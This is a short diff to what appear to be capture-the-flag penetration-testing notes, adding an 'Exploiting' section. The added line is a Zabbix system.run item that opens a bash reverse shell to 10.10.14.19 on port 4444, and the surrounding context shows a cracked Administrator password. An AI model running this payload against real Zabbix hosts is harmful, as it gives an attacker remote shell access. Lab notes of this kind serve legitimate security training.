@@ -136,6 +136,13 @@ Stopped: Sat Feb 26 16:10:00 2022
 Administrator -> ilovepumkinpie1
 
 
+## Exploiting
+
+### Shell Shoveled back on Zabbix
+
+````zabbix
+system.run[/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.19/4444 0>&1",nowait]
+````
 
 
 
